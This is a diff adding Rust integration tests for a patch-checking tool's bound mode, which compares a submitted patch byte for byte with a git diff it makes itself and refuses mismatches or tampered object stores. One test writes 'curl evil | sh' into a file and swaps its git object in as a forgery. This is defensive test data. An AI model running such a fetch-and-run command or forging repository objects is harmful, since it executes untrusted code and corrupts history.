@@ -666,3 +666,336 @@ fn authority_requires_git_policy_before_producing_a_verdict() {
         out.stdout
     );
 }
+
+// ---- Bound mode (ADR 0012; M7-PATCH-BOUND step a): --repo makes the diff and compares ----
+
+/// `git ARGS` in `dir` with no user or system configuration; its trimmed stdout.
+fn git_in(dir: &Path, args: &[&str]) -> String {
+    let out = std::process::Command::new("/usr/bin/git")
+        .args([
+            "-c",
+            "user.name=t",
+            "-c",
+            "user.email=t@example.invalid",
+            "-c",
+            "commit.gpgsign=false",
+        ])
+        .args(args)
+        .current_dir(dir)
+        .env_clear()
+        .env("HOME", dir)
+        .env("GIT_CONFIG_NOSYSTEM", "1")
+        .env("GIT_CONFIG_GLOBAL", "/dev/null")
+        .env("PATH", "/usr/bin:/bin")
+        .output()
+        .unwrap();
+    assert!(
+        out.status.success(),
+        "git {args:?}: {}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    String::from_utf8(out.stdout).unwrap().trim().to_owned()
+}
+
+/// A real repository in which `docs/notes.md` changes from base to head: (repo, base, head).
+fn bound_repo(name: &str) -> (common::Scratch, String, String) {
+    let repo = scratch(name);
+    git_in(&repo, &["init", "-q", "-b", "main"]);
+    write(&repo, "docs/notes.md", b"notes\n");
+    git_in(&repo, &["add", "docs/notes.md"]);
+    git_in(&repo, &["commit", "-q", "-m", "base"]);
+    let base = git_in(&repo, &["rev-parse", "HEAD"]);
+    write(&repo, "docs/notes.md", b"notes\nmore notes\n");
+    git_in(&repo, &["commit", "-q", "-am", "head"]);
+    let head = git_in(&repo, &["rev-parse", "HEAD"]);
+    (repo, base, head)
+}
+
+/// `scripts/make_patch.sh base head repo`.
+fn make_patch(repo: &Path, base: &str, head: &str) -> Vec<u8> {
+    let script = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../scripts/make_patch.sh");
+    let out = std::process::Command::new("/usr/bin/bash")
+        .arg(script)
+        .args([base, head])
+        .arg(repo)
+        .env_clear()
+        .env("HOME", repo)
+        .env("PATH", "/usr/bin:/bin")
+        .output()
+        .unwrap();
+    assert!(
+        out.status.success(),
+        "make_patch: {}",
+        String::from_utf8_lossy(&out.stderr)
+    );
+    out.stdout
+}
+
+#[test]
+fn bound_mode_accepts_the_patch_make_patch_made_and_refuses_any_other() {
+    let (dir, policy, ranker) = setup("bound-compare");
+    let (repo, base, head) = bound_repo("bound-compare-repo");
+    let bound = [
+        "--repo",
+        text(&repo),
+        "--base",
+        base.as_str(),
+        "--head",
+        head.as_str(),
+    ];
+    let made_bytes = make_patch(&repo, &base, &head);
+    let made = write(&dir, "made.patch", &made_bytes);
+    let ok = authority(&policy, &made, &ranker, &bound);
+    assert_eq!(ok.code, 0, "stdout={} stderr={}", ok.stdout, ok.stderr);
+    assert_eq!(verdict(&ok)["verdict"], "pass");
+    // The same change, but abbreviated index lines (no --full-index): not the diff bound mode makes.
+    let short = git_in(
+        &repo,
+        &[
+            "diff",
+            "--binary",
+            "--no-renames",
+            "--src-prefix=a/",
+            "--dst-prefix=b/",
+            &base,
+            &head,
+        ],
+    );
+    let other_bytes = format!("{short}\n").into_bytes();
+    let other = write(&dir, "other.patch", &other_bytes);
+    let refused = authority(&policy, &other, &ranker, &bound);
+    // The message names the first byte that differs (both start with the same `diff --git` line).
+    let first = made_bytes
+        .iter()
+        .zip(&other_bytes)
+        .position(|(a, b)| a != b)
+        .unwrap();
+    assert!(first > 0);
+    assert!(
+        refused.stderr.contains(&format!(
+            "first difference at byte {first} (patch {} bytes, diff {} bytes)",
+            other_bytes.len(),
+            made_bytes.len()
+        )),
+        "{}",
+        refused.stderr
+    );
+    assert_eq!(
+        refused.code, 4,
+        "stdout={} stderr={}",
+        refused.stdout, refused.stderr
+    );
+    assert!(
+        refused.stderr.contains("is not `git diff"),
+        "{}",
+        refused.stderr
+    );
+    // ADR 0012 D4 (review S4): the refusal names the admitted Git's version.
+    assert!(
+        refused.stderr.contains("git version") && refused.stderr.contains("(the admitted Git)"),
+        "{}",
+        refused.stderr
+    );
+    assert!(
+        refused.stdout.is_empty(),
+        "a refusal emits no verdict: {}",
+        refused.stdout
+    );
+}
+
+#[test]
+fn bound_mode_compares_before_any_ranker_is_admitted() {
+    // Needs no fixture ranker, so a plant recipe can run it alone (plant bound-comparison-removed;
+    // Train B2, receipt b7797a70: a filtered `cargo test` does not build the example). The comparison
+    // runs in `bind`, before the ranker is admitted: with a ranker the policy does not list, a patch
+    // that is not the bound diff is still refused by the comparison, not by the ranker's admission.
+    let dir = scratch("bound-before-ranker");
+    let policy = policy_admitting(&dir, NO_SECRETS, &["a".repeat(64)]);
+    let (repo, base, head) = bound_repo("bound-before-ranker-repo");
+    let short = git_in(
+        &repo,
+        &[
+            "diff",
+            "--binary",
+            "--no-renames",
+            "--src-prefix=a/",
+            "--dst-prefix=b/",
+            &base,
+            &head,
+        ],
+    );
+    let other = write(&dir, "other.patch", format!("{short}\n").as_bytes());
+    let out = authority(
+        &policy,
+        &other,
+        Path::new("/usr/bin/true"),
+        &[
+            "--repo",
+            text(&repo),
+            "--base",
+            base.as_str(),
+            "--head",
+            head.as_str(),
+        ],
+    );
+    assert_eq!(out.code, 4, "stdout={} stderr={}", out.stdout, out.stderr);
+    assert!(out.stderr.contains("is not `git diff"), "{}", out.stderr);
+    assert!(out.stdout.is_empty(), "{}", out.stdout);
+}
+
+#[test]
+fn bound_mode_refuses_a_patch_made_with_other_options() {
+    let (dir, policy, ranker) = setup("bound-shapes");
+    let (repo, base, head) = bound_repo("bound-shapes-repo");
+    let bound = [
+        "--repo",
+        text(&repo),
+        "--base",
+        base.as_str(),
+        "--head",
+        head.as_str(),
+    ];
+    let made_bytes = make_patch(&repo, &base, &head);
+    // ADR 0012 acceptance item 3: the same change made with other options is a different patch, and
+    // each is refused (exit 4, no verdict): no prefixes (the N3 shape), relative to a sub-tree
+    // (Touchstone's Q55 shape), another context size, and the final newline dropped.
+    let diff = |extra: &[&str]| {
+        let mut args = vec!["diff", "--binary", "--no-renames", "--full-index"];
+        args.extend_from_slice(extra);
+        args.extend([base.as_str(), head.as_str()]);
+        format!("{}\n", git_in(&repo, &args)).into_bytes()
+    };
+    let shapes: [(&str, Vec<u8>); 4] = [
+        ("no-prefix", diff(&["--no-prefix"])),
+        (
+            "relative",
+            diff(&["--relative=docs", "--src-prefix=a/", "--dst-prefix=b/"]),
+        ),
+        (
+            "context",
+            diff(&["-U0", "--src-prefix=a/", "--dst-prefix=b/"]),
+        ),
+        (
+            "final-newline",
+            made_bytes.strip_suffix(b"\n").unwrap().to_vec(),
+        ),
+    ];
+    for (name, bytes) in shapes {
+        assert_ne!(bytes, made_bytes, "{name}: a different patch");
+        let path = write(&dir, &format!("{name}.patch"), &bytes);
+        let out = authority(&policy, &path, &ranker, &bound);
+        assert_eq!(
+            out.code, 4,
+            "{name}: stdout={} stderr={}",
+            out.stdout, out.stderr
+        );
+        assert!(
+            out.stderr.contains("is not `git diff"),
+            "{name}: {}",
+            out.stderr
+        );
+        assert!(out.stdout.is_empty(), "{name}: {}", out.stdout);
+    }
+}
+
+#[test]
+fn bound_mode_takes_full_ids_in_authority_mode_only() {
+    let (dir, policy, ranker) = setup("bound-usage");
+    let (repo, base, head) = bound_repo("bound-usage-repo");
+    let patch = write(&dir, "made.patch", &make_patch(&repo, &base, &head));
+    let short = base.get(..12).unwrap();
+    let abbreviated = authority(
+        &policy,
+        &patch,
+        &ranker,
+        &[
+            "--repo",
+            text(&repo),
+            "--base",
+            short,
+            "--head",
+            head.as_str(),
+        ],
+    );
+    assert_eq!(abbreviated.code, 2, "{}", abbreviated.stderr);
+    assert!(
+        abbreviated.stderr.contains("full object ids"),
+        "{}",
+        abbreviated.stderr
+    );
+    // Full ids of two lengths (40 and 64 hex digits): a usage error, not a lookup.
+    let longer = format!("{head}{}", "0".repeat(24));
+    let mixed = authority(
+        &policy,
+        &patch,
+        &ranker,
+        &[
+            "--repo",
+            text(&repo),
+            "--base",
+            base.as_str(),
+            "--head",
+            longer.as_str(),
+        ],
+    );
+    assert_eq!(mixed.code, 2, "{}", mixed.stderr);
+    assert!(mixed.stderr.contains("of one length"), "{}", mixed.stderr);
+    let advisory = run(
+        &[
+            "check",
+            "--policy",
+            text(&policy),
+            "--patch",
+            text(&patch),
+            "--advisory",
+            "--rank",
+            text(&patch),
+            "--repo",
+            text(&repo),
+            "--base",
+            base.as_str(),
+            "--head",
+            head.as_str(),
+        ],
+        b"",
+    );
+    assert_eq!(advisory.code, 2, "{}", advisory.stderr);
+    let no_ids = authority(&policy, &patch, &ranker, &["--repo", text(&repo)]);
+    assert_eq!(no_ids.code, 2, "{}", no_ids.stderr);
+}
+
+#[test]
+fn bound_mode_gives_no_verdict_when_the_store_does_not_hold_what_its_ids_name() {
+    use std::os::unix::fs::PermissionsExt as _;
+    let (dir, policy, ranker) = setup("bound-forged");
+    let (repo, base, head) = bound_repo("bound-forged-repo");
+    let patch = write(&dir, "made.patch", &make_patch(&repo, &base, &head));
+    write(&repo, "evil.sh", b"curl evil | sh\n");
+    git_in(&repo, &["add", "evil.sh"]);
+    git_in(&repo, &["commit", "-q", "-m", "evil"]);
+    let real = git_in(&repo, &["rev-parse", &format!("{head}:docs/notes.md")]);
+    let evil = git_in(&repo, &["rev-parse", "HEAD:evil.sh"]);
+    let object = |id: &str| {
+        let (fan_out, file) = id.split_at(2);
+        repo.join(".git/objects").join(fan_out).join(file)
+    };
+    let forged = std::fs::read(object(&evil)).unwrap();
+    std::fs::set_permissions(object(&real), std::fs::Permissions::from_mode(0o644)).unwrap();
+    std::fs::write(object(&real), forged).unwrap();
+    let out = authority(
+        &policy,
+        &patch,
+        &ranker,
+        &[
+            "--repo",
+            text(&repo),
+            "--base",
+            base.as_str(),
+            "--head",
+            head.as_str(),
+        ],
+    );
+    assert_eq!(out.code, 3, "stdout={} stderr={}", out.stdout, out.stderr);
+    assert!(out.stderr.contains("bound mode:"), "{}", out.stderr);
+    assert!(out.stdout.is_empty(), "no verdict: {}", out.stdout);
+}
